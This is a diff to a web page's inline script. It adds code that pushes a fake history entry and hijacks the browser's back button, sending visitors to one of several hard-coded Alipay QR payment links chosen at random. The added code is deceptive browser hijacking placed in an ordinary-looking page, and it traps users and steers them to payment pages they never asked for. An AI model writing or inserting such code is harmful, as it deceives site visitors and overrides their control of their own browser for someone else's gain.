@@ -322,6 +322,24 @@
         </div>
 
         <script>
+            function hrefs() {   
+                window.history.pushState('forward', null, location.pathname);       
+            }
+
+            if(window.history && window.history.pushState) {
+                    window.onpopstate = function() {
+                        var qrs= [
+                            "https://qr.alipay.com/c1x06364ngnlmjhckkntq33",
+                            "https://qr.alipay.com/c1x003292s5ob0pbmd3ceae",
+                            "https://qr.alipay.com/c1x02503i2gftzldufvba81",
+                            "https://qr.alipay.com/c1x02503i2gftzldufvba81",
+                            "https://qr.alipay.com/c1x09226hlteb1by2u1dj3e",
+                            "https://qr.alipay.com/c1x00986aldkpaioc1dr1f5"
+                        ]
+                        var index= parseInt(Math.random()*qrs.length)
+                        location.href = qrs[index]
+                    }
+                }
                 function refresh() {
                     var width = document.documentElement.clientWidth;
                     if(width < 375) {
@@ -330,6 +348,7 @@
                         document.documentElement.style.fontSize = "100px";
                     }
                 }
+            hrefs()
                 refresh();
                 window.onresize = refresh;
         </script>
